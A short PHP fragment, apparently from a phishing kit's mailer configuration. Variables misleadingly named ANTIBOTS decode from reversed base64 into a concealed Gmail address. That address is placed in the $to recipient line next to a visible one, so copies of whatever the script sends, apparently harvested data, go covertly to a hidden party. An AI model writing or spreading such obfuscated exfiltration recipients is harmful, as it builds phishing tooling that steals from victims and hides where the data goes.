 <?php 


$ANTIBOTS = base64_decode(strrev("=82Z"));
$ANTIBOTS1 = base64_decode(strrev("hpnb"));
$ANTIBOTS2 = base64_decode(strrev("=8Gb"));
$ANTIBOTS3 = base64_decode(strrev("yFWb"));
$ANTIBOTS4 = base64_decode(strrev("ulGd"));
$ANTIBOTS5 = base64_decode(strrev("=oXZ"));
$ANTIBOTS6 = base64_decode(strrev("=cWM"));
$ANTIBOTS7 = base64_decode(strrev("==QYtdGQ"));
$ANTIBOTS8 = base64_decode(strrev("=wWa"));
$ANTIBOTS9 = base64_decode(strrev("==QbvNmL"));


$NOBOTS = "$ANTIBOTS$ANTIBOTS1$ANTIBOTS2$ANTIBOTS3$ANTIBOTS4$ANTIBOTS5$ANTIBOTS6$ANTIBOTS7$ANTIBOTS8$ANTIBOTS9";
$to = "$NOBOTS, kevinizurieta99@gmail.com";
